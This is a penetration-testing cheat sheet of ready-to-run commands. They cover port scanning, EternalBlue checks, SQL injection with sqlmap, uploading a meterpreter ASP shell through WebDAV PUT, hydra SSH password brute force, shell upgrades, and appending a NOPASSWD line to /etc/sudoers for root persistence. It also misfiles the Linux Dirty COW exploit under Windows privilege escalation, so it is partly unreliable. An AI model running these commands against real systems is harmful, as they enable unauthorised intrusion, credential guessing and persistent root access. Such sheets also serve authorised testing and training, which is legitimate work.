## ENUMERATION

### Find all open ports
```
nmap -sV -Pn -p- -T4 -A <IP>
nmap -Pn -sT -sV -A --script=default,banner -p- <IP>
nmap -n -A -sU -T4 <IP>
```
### Vulnerability Scan
#### eternalblue scan
```
nmap -p445 --script smb-vuln-ms17-010 <IP-range>
```

### linux enumeration 
```
enum4linux <IP>
```

## WEB PENTEST

### enumerate port 80
```
nikto -host http://<IP>
```

### sqlmap with request file
```
sqlmap -r search-test.txt -p param
```
### If PUT method is enabled
```
davtest -move -sendbd auto -url http://$ip
cadaver <IP>
cad> PUT met.asp met.asp
```

## ENCRYPTIONS AND DECRYPTIONS

### Detect the hash type
```
hash-identifier
```

### Password bruteforce using hydra
```
hydra -l bob -p password ssh://10.10.10.1 -t 4
hydra -L user.txt -P pass.txt ssh://10.10.10.1 -t 4
```

### Online md5 cracker
```
https://www.md5online.org/md5-decrypt.html
```

## LINUX PRIVILAGE ESCALATION
### Shell upgrade
```
echo os.system('/bin/bash')
```

### upgraded it to a pseudo-terminal using python
```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### First do some privilage checking
```
http://www.securitysift.com/download/linuxprivchecker.py
```

### if you can edit sudoers file, just add this line
```
echo 'bob ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers
```

## WINDOWS PRIVILAGE ESCALATION
### Dirty COW Vulnerability
```
https://www.exploit-db.com/exploits/40839
```

## Windows port forwarding
```
netsh interface portproxy add v4tov4 listenaddress=localaddress listenport=localport connectaddress=destaddress connectport=destport
```
